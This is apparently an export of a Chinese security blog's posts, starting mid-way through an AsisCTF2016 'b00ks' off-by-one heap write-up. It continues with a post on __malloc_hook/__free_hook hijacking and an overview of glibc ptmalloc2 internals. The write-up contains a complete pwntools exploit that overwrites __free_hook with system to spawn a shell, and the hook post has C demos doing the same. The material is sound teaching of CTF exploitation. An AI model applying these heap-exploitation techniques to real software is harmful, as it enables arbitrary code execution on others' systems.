class="type">int</span> id;</span><br><span class="line"><span class="type">void</span> * book_name;</span><br><span class="line"><span class="type">void</span> *book_description;</span><br><span class="line"><span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//字节对齐后最终占到32字节</span></span><br></pre></td></tr></table></figure><h3 id="泄露book1地址"><a href="#泄露book1地址" class="headerlink" title="泄露book1地址"></a>泄露book1地址</h3><p>输入32个字节name再打印就可以泄露</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302012108199.png" alt="image-20230302012108199"></p><h3 id="实现可控"><a href="#实现可控" class="headerlink" title="实现可控"></a>实现可控</h3><p>我们再次修改another——name会再次把0x2060处覆盖为0，也就是说我们book1的结构体地址往低地址走了，而我们malloc的时候顺序是 book_name–&gt;book_description–&gt;book_struct</p><p>所有我们可以通过计算把book1地址变为book_description(具体为申请一个较大的description，有利于我们book1落在上面，通过对bookname控制调整可以准确落在什么)，我们的description可以再次修改，我们可以在book1的des伪造一个book结构体，如果说我们把伪造结构体的des改为book2的description地址，我们就可以通过修改1的des为想要读写地址，再通过</p><p>book2的des进行修改和读取</p><h3 id="读写什么"><a href="#读写什么" class="headerlink" title="读写什么"></a>读写什么</h3><p>开启了FULL RELRO，不能改写got表，程序中用到了free和malloc函数，我们可以打free_hook，将free 函数hook为system，description修改为binsh地址，这样我们free(description)就可以拿到shell，要拿到__free_hook地址我们还需要泄露libc的基址，我们可以利用malloc申请大内存，这样malloc就会调用mmap直接映射一块内存给我们，</p><p>这块内存和libc的基地址是固定的，我们可以泄露des地址，通过减去固定偏移得到libc基址</p><p>create_book(0x21000, “two”, 0x21000, “twodes”)</p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302020528381.png" alt="image-20230302020528381" style="zoom: 67%;"><p>得到偏移，0x7f3100400000-0x7f31003bc010&#x3D;0x43FF0</p><p>这里偏移还需要把aslr关掉，不关闭会随机化，试了一下libc2.35会随机，2.23不会，远程的话可能要利用bins去泄露动态地址</p><blockquote><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space </p><ul><li>0 &#x3D; 关闭</li><li>1 &#x3D; 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>2 &#x3D; 全随机。除了1中所述，还有heap。</li><li>ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责。但是只有在开启 ASLR 之后，PIE 才会生效。</li></ul></blockquote><p>由于我们第二次申请的内存都过大，都采用vmmap，所以malloc book2时之后第一个book1地址间隔0x30（数据大小0x20+chunk_head(0x10)）</p><p>伪造book1，payload&#x3D;p64(1) + p64(book_two_ad + 8)+p64(book_two_ad+16)+ p64(140)</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302022645243.png" alt="image-20230302022645243"></p><p>布置好之后，free</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302141959390.png" alt="image-20230302141959390"></p><p>本来是要拿到shell的可是2.35libc已经删除hook，可以看到free汇编里已经没有了，检测hook</p><p>换上libc2.23的机器重新计算偏移，拿到shell</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302152118170.png" alt="image-20230302152118170"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE15)&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_book</span>(<span class="params">name_size, book_name, desc_size, book_desc</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book name size: &#x27;</span>, <span class="built_in">str</span>(name_size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book name (Max 32 chars): &#x27;</span>, book_name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book description size: &#x27;</span>, <span class="built_in">str</span>(desc_size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book description: &#x27;</span>, book_desc)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_book</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter the book id you want to delete: &#x27;</span>, <span class="built_in">str</span>(book_id).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_book</span>(<span class="params">book_id, book_desc</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>, <span class="built_in">str</span>(book_id).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter new book description: &#x27;</span>, book_desc)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_book</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_author_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter author name:&#x27;</span>, name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_author_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line">input_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create_book(<span class="number">32</span>+<span class="number">0x20</span>+<span class="number">0x90</span>,<span class="string">&#x27;one&#x27;</span>,<span class="number">140</span>,<span class="string">&#x27;onedes&#x27;</span>)</span><br><span class="line">print_book()</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">book_one_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;book_one_ad&#x27;</span>,book_one_ad)</span><br><span class="line">create_book(<span class="number">0x21000</span>, <span class="string">&quot;two&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;twodes&quot;</span>)</span><br><span class="line">book_two_ad=book_one_ad+<span class="number">0x30</span></span><br><span class="line">payload=p64(<span class="number">1</span>) + p64(book_two_ad + <span class="number">8</span>)+p64(book_two_ad+<span class="number">16</span>)+ p64(<span class="number">140</span>)</span><br><span class="line">edit_book(<span class="number">1</span>,payload)</span><br><span class="line">change_author_name(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">print_book()</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">vmmap_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;vmmap_ad&#x27;</span>,vmmap_ad)</span><br><span class="line">base=vmmap_ad-<span class="number">0x58F010</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system_ad=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">free_hook_ad=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+base</span><br><span class="line">bin_ad=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+base</span><br><span class="line">p(<span class="string">&#x27;bin_ad&#x27;</span>,bin_ad)</span><br><span class="line">edit_book(<span class="number">1</span>,p64(free_hook_ad))</span><br><span class="line">edit_book(<span class="number">2</span>,p64(system_ad))</span><br><span class="line">edit_book(<span class="number">1</span>,p64(bin_ad))</span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Off By One </tag>
            
            <tag> Free Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc_hook&amp;&amp;free_hook hijack原理</title>
      <link href="/2023/03/01/malloc-hook&amp;free-hook/"/>
      <url>/2023/03/01/malloc-hook&amp;free-hook/</url>
      
        <content type="html"><![CDATA[<h1 id="malloc-hook和-free-hook-hijack原理"><a href="#malloc-hook和-free-hook-hijack原理" class="headerlink" title="__malloc_hook和__free_hook hijack原理"></a>__malloc_hook和__free_hook hijack原理</h1><p>Hook即钩子，截获API调用的技术，是将执行流程劫持到你自己的代码。</p><p>刚开始在Ubuntu22上做实验，一直不成功，又换了kali，还是不行，最后发现__free_hook,__malloc_hook,__realloc_hook,<em>_memalign_hook,</em>_after_morecore_hookg在libc-2.34的patch中被移除了，换了Ubuntu16 libc版本2.23，但是发现只是在ld链接时会找不到definition，也就是无法通过链接的环节，但是在libc库里还是有的，可能是考虑之前使用hook程序的兼容。</p><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:/usr/include$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.23-0ubuntu11.3) 2.23</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure><h2 id="malloc-free"><a href="#malloc-free" class="headerlink" title="malloc free"></a>malloc free</h2><p>先看一下malloc和free函数具体调用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">void</span> *x=<span class="built_in">malloc</span>(<span class="number">8</span>); </span><br><span class="line">  <span class="built_in">free</span>(x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301205645710.png" alt="image-20230301205645710"></p><p>由于版本不一样__malloc_hook在main_arena的上方偏移是不确定的，这里可以看到在malloc时会从取出__malloc_hook的值进行test，不为0则跳转，为0则继续malloc，这里采用了rip的寻址方式，很6，不利于我们分析，看静态汇编吧</p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301210214619.png" alt="image-20230301210214619"></p><p>不为0跳转到，为0直接get_free_list去fastbins找free chunk了（ glibc 2.26才引入tcache）</p><p> <img src="/2023/03/01/malloc-hook&free-hook/image-20230301210558248.png" alt="image-20230301210558248"></p><p>最后jmp到malloc_hook地址函数里，同时rdi的参数也未变，如果我们把hook改为system地址，那么只要在malloc时填入binsh地址就可以getshell</p><h3 id="free同理"><a href="#free同理" class="headerlink" title="free同理"></a>free同理</h3><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211127857.png" alt="image-20230301211127857"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211206232.png" alt="image-20230301211206232"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211304185.png" alt="image-20230301211304185"></p><p>free hook不同的是采用了call的形式转移pc</p><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc hook"></a>malloc hook</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __malloc_hook =system;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">10</span>]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *s = <span class="built_in">malloc</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o malloc_hook malloc_hook.c </span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301212355513.png" alt="image-20230301212355513"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301212937121.png" alt="image-20230301212937121"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000041F220                               malloc_hook_ini proc near               ; CODE XREF: calloc+2C8↑p</span><br><span class="line">.text:000000000041F220                                                                       ; DATA XREF: .data:__malloc_hook↓o</span><br><span class="line">.text:000000000041F220                               ; __unwind &#123;</span><br><span class="line">.text:000000000041F220 55                            push    rbp</span><br><span class="line">.text:000000000041F221 53                            push    rbx</span><br><span class="line">.text:000000000041F222 48 89 FD                      mov     rbp, rdi</span><br><span class="line">.text:000000000041F225 48 83 EC 08                   sub     rsp, 8</span><br><span class="line">.text:000000000041F229 8B 05 35 B5 2A 00             mov     eax, cs:__libc_malloc_initialized</span><br><span class="line">.text:000000000041F22F 48 C7 05 4E B5 2A 00 00 00 00+mov     cs:__malloc_hook, 0</span><br><span class="line">.text:000000000041F22F 00</span><br><span class="line">.text:000000000041F23A 85 C0                         test    eax, eax</span><br></pre></td></tr></table></figure><p>这时候我们发现malloc_hook并没有为0，而是malloc_hook_ini，会在mov cs:__malloc_hook, 0 置为0</p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213351476.png" alt="image-20230301213351476"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213534133.png" alt="image-20230301213534133"></p><h2 id="free-hook同理"><a href="#free-hook同理" class="headerlink" title="free hook同理"></a>free hook同理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *str = <span class="built_in">malloc</span>(<span class="number">160</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(str,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;__free_hook: 0x%016X\n&quot;</span>,__free_hook);</span><br><span class="line">    __free_hook = system;</span><br><span class="line">    <span class="built_in">free</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o free_hook free_hook.c </span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213905560.png" alt="image-20230301213905560"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301214108772.png" alt="image-20230301214108772"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Malloc Hook </tag>
            
            <tag> Free Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEAP MANAGER</title>
      <link href="/2023/02/25/23-2-25-heap/"/>
      <url>/2023/02/25/23-2-25-heap/</url>
      
        <content type="html"><![CDATA[<h1 id="HEAP-MANGER"><a href="#HEAP-MANGER" class="headerlink" title="HEAP MANGER"></a>HEAP MANGER</h1><h2 id="为什么要有堆管理器"><a href="#为什么要有堆管理器" class="headerlink" title="为什么要有堆管理器"></a>为什么要有堆管理器</h2><p>堆是动态分配的虚拟内存(只有在程序访问到这块虚拟内存时，系统才会建立虚拟内存和物理内存的映射，称为延迟绑定机制，大大节省了内存)，从低地址向高地址生长，程序可能需要频繁的向操作系统申请内存的系统调用，与此同时就伴随这从用户态到内核态的多次转换，转换的同时需要保存context，影响程序性能，堆管理器就出现了，在操作系统和用户当作中间人，他会申请较大的内存，管理分配，1、响应用户申请内存的请求2、管理用户所释放的内存，堆管理器并非由内核实现的，Linux标准发行版中使用的堆分配器是glibc中的堆分配器：ptmalloc2</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">平台：操作系统 --&gt; 堆管理器 --&gt; 用户</span><br><span class="line">资源：物理内存 --&gt; arena  --&gt;可用内存</span><br></pre></td></tr></table></figure><span id="more"></span><img src="/2023/02/25/23-2-25-heap/image-20230225111848174.png" alt="image-20230225111848174" style="zoom: 50%;"><h2 id="堆管理器ptmalloc2"><a href="#堆管理器ptmalloc2" class="headerlink" title="堆管理器ptmalloc2"></a>堆管理器ptmalloc2</h2><p><strong>arena</strong> 指的是管理器在第一次malloc时申请到的大内存快，堆内存区域本身，并不是结构，可以理解为内存池；主线程的 main arena通过&#x3D;&#x3D;(s)brk&#x3D;&#x3D;创建，没开alsr分布在数据区(.data&#x2F;.bss)的结尾，开启后在尾部随机偏移处；其他线程的 arena包括一些主线程的大内存 是通过 &#x3D;&#x3D;mmap&#x3D;&#x3D; 创建，分布在Memory-mapped segment，也就是我们glic动态链接库加载的区域</p><p><strong>malloc_state</strong>（<strong>main arena</strong> <strong>的</strong> <strong>malloc_state</strong> <strong>并不是</strong> <strong>heap segment</strong> <strong>的一部分，而是一个全局变量，存储在</strong> <strong>libc.so</strong> <strong>的数据段</strong>）管理 arena 的核心结构，包含堆的状态信息、bins 链表等；main arena 对应的 malloc state 结构存储在 glibc 全局变量中；其他线程 arena 对应的 malloc_state 存储在 arena 本身中</p><p><strong>bin</strong> 用来管理空闲内存块，通常用链表的结构来进行组织</p><p><strong>chunks</strong> 内存块结构，是malloc具体在arena上申请给用户的</p><h2 id="chunks"><a href="#chunks" class="headerlink" title="chunks"></a>chunks</h2><p>top chunk arena中从未被使用过的内存区域，inuse 比特位始终为 1，否则会合并旁边的chunk</p><p>malloc_chunk 已被分配且填写了相应数据的chunk</p><p>free chunk 被释放掉的malloced chunk</p><p><code>allocated chunk</code>是一个更加通用的术语，它可以指任何已经被分配给应用程序使用的内存块。</p><p>last remainder chunk malloc分割原chunk后剩余的部分</p><img src="/2023/02/25/23-2-25-heap/image-20230225112707364.png" alt="image-20230225112707364" style="zoom:67%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">    <span class="comment">/*above chunk——head*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>prev_size</p><ul><li><blockquote><p>如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一chunk 大小）</strong>是空闲的话，那该字段记录的是前一个chunk 的大小 (包括chunk头)。否则，该字段可以用来存储物理相邻的前一个chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> ，也就是当前一个chunk是malloced，那么这个字段是无用的，为了不浪费，我们会把这块内存在必要时给到前一个chunk，比如我们在64位程序下，malloc(0x10)，实际会分配0x20个字节，会包括chunk_head，free掉后，我们再次malloc(0x18)，该chunk的高地址处的chunk的pre_size字段是无用的，会被利用起来，也就是会再次把之前malloc(0x10)的chunk给到我们，<strong>这就是 chunk 中的空间复用</strong></p></blockquote></li></ul></li><li><p>size</p><ul><li><blockquote><p>chunk的大小包括chunk_head，是安照2 * SIZE_SZ(字长)对齐的，也就是32位是0x8，64位是0x10，恒是8的倍数，这样后三位bit位恒为0，我们将其设置为标志位</p><ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。 &#x3D;&#x3D;A&#x3D;&#x3D;</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 free_chunk的始终为0 &#x3D;&#x3D;M&#x3D;&#x3D;</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。&#x3D;&#x3D;P&#x3D;&#x3D;</li></ul></blockquote></li></ul></li><li><p>fd bk</p><blockquote><p>allocated状态下从这里开始为用户数据区，也就是我们通常说的malloc返回给用户的地址就是从这里开始的，free状态下会被添加到对应的空闲管理链表中</p><p>fd 指向下一个（非物理相邻）空闲的 chunk</p><p>bk 指向上一个（非物理相邻）空闲的 chunk</p><p><code>fd</code>和<code>bk</code>是<code>forward</code>和<code>backward</code>的缩写。</p></blockquote></li><li><p>fd_nextsize bk_nextsize</p><ul><li><blockquote><p>free时使用，用于large chunk</p><p>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></p></blockquote></li></ul></li></ul><p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>用户释放掉的 chunk 不会马上归还给系统，会放入bin或者合并到top chunk中去,ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。&#x3D;&#x3D;mmap申请释放时直接归还操作系统 不进入bin&#x3D;&#x3D;</p><p>ptmalloc2维护bins数组</p><p>根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins(小)，small bins(中)，large bins（大），unsorted bin（未整理）。</p><ol><li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li><li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 <strong>2 个机器字长</strong>，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li></ol><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>malloc state 中的 fastbinsY[]</p><table><thead><tr><th>fastbinsY[]</th><th>x86（size_t&#x3D;4）</th><th>x64（size_t&#x3D;8）</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x20</td></tr><tr><td>1</td><td>0x18</td><td>0x30</td></tr><tr><td>2</td><td>0x20</td><td>0x40</td></tr><tr><td>3</td><td>0x28</td><td>0x50</td></tr><tr><td>4</td><td>0x30</td><td>0x60</td></tr><tr><td>5</td><td>0x38</td><td>0x70</td></tr><tr><td>6</td><td>0x40</td><td>0x80</td></tr></tbody></table><ol><li>ptmalloc2 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内,fast bins P位始终为1，不合并物理相邻的chunk</li><li>是个单链表结构，只是用fd成员</li><li>用户申请chunk大小&lt;&#x3D;MAX_FAST_SIZE时，优先从fastbins查找空闲块，LIFO规则，满足频繁的申请和释放同一块chunk，满足局部性</li><li>ptmalloc 默认情况下会调用 set_max_fast(s) 将全局变量 global_max_fast 设置为 DEFAULT_MXFAST，也就是设置 fast bins 中 chunk 的最大值。当 MAX_FAST_SIZE 被设置为 0 时，系统就不会支持 fastbin 。</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225144619435.png" alt="image-20230225144619435" style="zoom:50%;"></li></ol><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><ol><li>可以视为空闲 chunk 回归其所属 bin 